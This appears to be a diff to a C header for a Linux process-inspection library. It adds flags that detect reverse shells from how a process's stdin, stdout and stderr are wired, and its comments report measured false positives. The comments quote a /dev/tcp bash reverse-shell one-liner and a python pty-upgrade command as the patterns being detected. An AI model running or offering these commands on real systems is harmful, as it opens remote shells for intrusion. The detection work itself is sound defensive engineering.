@@ -204,6 +204,13 @@
 
 #include "kofantarc.h"
 
+/*
+ * The longest /proc/<pid>/fd link this walk keeps. A socket link is about
+ * twenty bytes and a path can be any length; 256 holds every real one and
+ * bounds the plist handle, which carries three of them.
+ */
+#define KOFA_FDLINK_MAX 256u
+
 /* ---------------------------------------------------------------- a process */
 
 /* kofa_proc.flags */
@@ -290,52 +297,106 @@ enum {
 	 * way to spell the name that avoids it.
 	 *
 	 * A real kernel thread never sets this: it has PF_KTHREAD, so the two
-	 * agree. The false positive left is a program that legitimately
-	 * brackets its own name, which exists but is rare enough to read.
+	 * agree.
+	 *
+	 * IT ALSO REQUIRES AN EXECUTABLE ON DISK - an exe link that resolves to
+	 * an absolute path. A real kernel thread has no exe link at all, so
+	 * without this test a process whose readlink merely FAILED - refused,
+	 * or gone between the two reads - could reach here and be called a
+	 * masquerade on the strength of a name and a missing answer. Requiring
+	 * a path turns the flag into a statement about two things that were
+	 * both observed: it calls itself a kernel thread, and here is the file
+	 * it is actually running.
+	 *
+	 * The false positive left is a program that legitimately brackets its
+	 * own name, which exists but is rare enough to read.
 	 */
 	KOFA_PF_FAKE_KTHREAD = 1u << 5,
 
 	/*
 	 * ONE OF stdin, stdout OR stderr IS A SOCKET.
 	 *
-	 * The shape of a reverse shell, and the reason it is worth a flag of
-	 * its own rather than a signature: `bash -i >& /dev/tcp/host/port 0>&1`
-	 * writes no file, loads no module, and contains no byte a scanner
-	 * could match - what it DOES is put a socket where a terminal goes.
-	 * So does every python, perl, nc and socat variant of the same thing,
-	 * which is why this catches the technique rather than the tool.
-	 *
-	 * NOT A VERDICT AND GENUINELY COMMON. Measured on the development
-	 * desktop: EIGHT processes carry this at rest, every one of them
-	 * legitimate - VS Code's language servers, its extension hosts, and
-	 * this tree's own agent - because modern desktop IPC is sockets and
-	 * those children are spawned with the socket already on their stdio.
-	 * Every network daemon that forks a worker per connection does the
-	 * same, and so does anything a socket-activated systemd unit starts.
-	 *
-	 * SO THE FLAG ALONE IS NOT THE FINDING, AND THE MEASUREMENT SAYS WHAT
-	 * IS. A controlled `bash -i >& /dev/tcp/127.0.0.1/48231 0>&1` against
-	 * a local listener, beside the eight:
-	 *
-	 *     the eight legitimate  23..94 fds,  5..14 of them sockets
-	 *     the reverse shell        4 fds,       4 of them sockets
-	 *
-	 * A real program holds a working set of descriptors - files, epoll,
-	 * pipes, a terminal - and its sockets are a fraction of them. A shell
-	 * handed a socket for stdio holds NOTHING ELSE: the ratio is 1.0 and
-	 * the count is tiny, because nothing opened anything. That is why
-	 * n_fd and n_socket are collected beside this flag rather than the
-	 * flag being collected alone - the ratio is the signal and the flag is
-	 * only what makes it worth computing.
-	 *
-	 * The join is still the CALLER'S: this says what the descriptors are,
-	 * kofa_proc.comm and .cmdline say what the program is, and nothing
-	 * here decides that a small ratio plus a shell is malice. A container
-	 * entry point is a shell with four descriptors too.
-	 *
-	 * Costs three readlinks per process. See kofa_plist_option.no_fds.
+	 * THE WEAK FORM, kept because it is what makes the strong one below
+	 * worth computing, and reported because a caller may want the broad
+	 * set. On its own it is close to useless on a desktop: measured, EIGHT
+	 * processes carry it at rest here and every one is legitimate - VS
+	 * Code's language servers, its extension hosts, this tree's own agent.
+	 * Modern desktop IPC is sockets, and those children are spawned with
+	 * the socket already on their stdio.
 	 */
-	KOFA_PF_STDIO_SOCKET = 1u << 6
+	KOFA_PF_STDIO_SOCKET = 1u << 6,
+
+	/*
+	 * stdin AND stdout ARE THE SAME SOCKET - not two sockets, the same
+	 * one, compared by the inode the kernel names it with.
+	 *
+	 * THIS IS THE REVERSE SHELL, and the difference between this and the
+	 * flag above is the difference between a heuristic and a finding.
+	 *
+	 * `bash -i >& /dev/tcp/host/port 0>&1` has one socket and dups it onto
+	 * both ends, because there IS only one connection. A program that was
+	 * merely spawned with socket stdio has a socketpair, and a socketpair
+	 * is two objects with two inodes - one for each direction.
+	 *
+	 * Measured on this desktop, which is the whole argument:
+	 *
+	 *     the eight with socket stdio   stdin 14376315, stdout 14376317
+	 *                                   stdin 14382089, stdout 14382091
+	 *                                   stdin 14362326, stdout 14362328  ...
+	 *                                   - always a distinct pair
+	 *     a controlled reverse shell    stdin 14899490, stdout 14899490
+	 *
+	 * Sweeping every process on the machine for stdin == stdout == socket
+	 * returned exactly ONE process, and it was the reverse shell. Eight
+	 * false positives became none, for one string comparison.
+	 *
+	 * STILL NOT A VERDICT, and the honest caveats are short. An inetd-style
+	 * service handed one connected socket as stdio has the same shape and
+	 * is doing its job; so does a container entry point wired that way. It
+	 * is a statement about the DESCRIPTORS, and what makes it a finding is
+	 * the other half - see KOFA_PF_SHELL - which this library reports
+	 * separately and does not join.
+	 */
+	KOFA_PF_STDIO_SAME_SOCKET = 1u << 7,
+
+	/*
+	 * stdin, stdout AND stderr ARE ALL THE SAME TERMINAL.
+	 *
+	 * The shape a reverse shell has AFTER it is upgraded to a pty - the
+	 * `python -c 'import pty; pty.spawn("/bin/bash")'` step - because the
+	 * upgrade replaces the raw socket with a pseudo-terminal and puts it
+	 * on all three.
+	 *
+	 * READ THE NEXT SENTENCE BEFORE MATCHING ON THIS. It is also exactly
+	 * what EVERY interactive shell in EVERY terminal window looks like,
+	 * because that is what a terminal is. Alone it selects every login
+	 * shell on the machine and nothing else - it is not a weak signal, it
+	 * is not a signal.
+	 *
+	 * It is carried because the fact is free once the three links are read
+	 * and because the thing that separates the two cases is not here: it is
+	 * WHO HOLDS THE OTHER END. A terminal emulator or sshd owns the master
+	 * side of a real login's pty; for an upgraded shell it is whatever the
+	 * attacker ran. That is a walk of other processes' descriptors, which
+	 * is a caller's job and not this flag's.
+	 */
+	KOFA_PF_STDIO_SAME_TTY = 1u << 8,
+
+	/*
+	 * THE EXECUTABLE IS A SHELL, by the name of the file being run.
+	 *
+	 * sh, bash, dash, zsh, ksh, ash, busybox, fish, csh, tcsh. A NAME and
+	 * therefore a claim, like every name: a payload copied to /tmp/bash is
+	 * not a shell and a shell copied to /tmp/nginx still is. It is here
+	 * rather than in each caller for the reason kof_classify_path is where
+	 * it is - four consumers matching this list privately is four chances
+	 * to disagree about which names are on it.
+	 *
+	 * On its own it is not interesting at all; a machine is full of shells.
+	 * It exists to be the second half of KOFA_PF_STDIO_SAME_SOCKET, and
+	 * the join is still the caller's.
+	 */
+	KOFA_PF_SHELL = 1u << 9
 };
 
 struct kofa_proc {
@@ -417,6 +478,24 @@ struct kofa_proc {
 	 */
 	uint32_t n_fd;
 	uint32_t n_socket;
+
+	/*
+	 * WHAT stdin, stdout AND stderr ACTUALLY POINT AT, verbatim as the
+	 * kernel spells it: "socket:[14899490]", "/dev/pts/3", "pipe:[123]",
+	 * "/dev/null", or a path. Borrowed, "" when the link could not be
+	 * read.
+	 *
+	 * The raw strings and not just the flags above, for the reason
+	 * kofa_region keeps `path` beside its classification: a flag is a
+	 * decision that can be wrong, and the text is the only thing that lets
+	 * anybody check it - or ask a question this library did not think of.
+	 * Comparing the two for equality is exactly how
+	 * KOFA_PF_STDIO_SAME_SOCKET is computed, and a caller wanting a
+	 * different comparison has the same material.
+	 */
+	const char *fd_stdin;
+	const char *fd_stdout;
+	const char *fd_stderr;
 };
 
 struct kofa_plist_option {
